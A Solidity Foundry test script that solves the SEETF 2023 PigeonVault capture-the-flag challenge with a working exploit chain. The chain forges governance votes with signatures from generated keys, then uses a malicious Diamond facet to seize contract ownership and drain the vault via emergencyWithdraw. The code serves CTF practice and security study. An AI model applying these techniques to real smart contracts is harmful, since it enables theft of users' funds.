// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2 <0.9.0;

import "forge-std/Test.sol";
import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "src/SEETF_2023/PigeonVault/Setup.sol";
import "./PigeonVaultAttack.sol";


contract Attacker is Test, Script {
    address deployer = makeAddr("deployer");
    uint256 attacker_key = vm.envUint("ATTACKER_KEY");
    address attacker = vm.addr(attacker_key);

    SetupPigeonVault setup;

    function setUp() public {
        vm.createSelectFork("mainnet");
        vm.startPrank(deployer, deployer);

        deal(deployer, 3000 ether);
        setup = new SetupPigeonVault{value: 3000 ether}();

        vm.stopPrank();
        console2.log("setUp done!");
    }

    function testExploit() public {
        vm.startPrank(attacker, attacker);

        solve();
        console.log("isSolved:", setup.isSolved());

        vm.stopPrank();
    }

    function solve() public {
        PigeonDiamond pigeonDiamond = setup.pigeonDiamond();
        setup.claim();
        FeatherCoinFacet ftc = FeatherCoinFacet(address(pigeonDiamond));
        emit log_named_decimal_uint("Attacker FTC amount:", ftc.balanceOf(attacker), 18);

        PigeonVaultAttack attack = new PigeonVaultAttack(payable(address(pigeonDiamond)));
        ftc.delegate(address(attack));    // // set checkpoint before proposal
        emit log_named_decimal_uint("attackContract's vote", ftc.getCurrentVotes(address(attack)), 18);

        attack.submit();
        uint proposalID = attack.proposalID();
        emit log_named_uint("Submitted proposal ID:", proposalID);

        bytes[] memory sigs = new bytes[](11);
        for (uint i = 0; i < 11; i++) {
            (, uint256 privateKey) = makeAddrAndKey(string(abi.encode(i)));

            (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, keccak256("\x19Ethereum Signed Message:\n32"));
            // bytes memory sig = abi.encodePacked(vm.sign(privateKey, keccak256("\x19Ethereum Signed Message:\n32")));
            sigs[i] = abi.encodePacked(r, s, v);
        }

        vm.roll(block.number + 1);
        attack.vote(sigs);

        vm.roll(block.number + 5);
        DAOFacet dao = DAOFacet(address(pigeonDiamond));
        dao.executeProposal(proposalID);

        console2.log("Old owner:", OwnershipFacet(address(pigeonDiamond)).owner());
        DiamondAttackFacet attackFacet = DiamondAttackFacet(address(pigeonDiamond));
        attackFacet.attack(attacker);
        console2.log("New owner:", OwnershipFacet(address(pigeonDiamond)).owner());

        PigeonVaultFacet pigeonVault = PigeonVaultFacet(address(pigeonDiamond));
        pigeonVault.emergencyWithdraw();
        emit log_named_decimal_uint("Attacker balance:", address(attacker).balance, 18);

    }
}


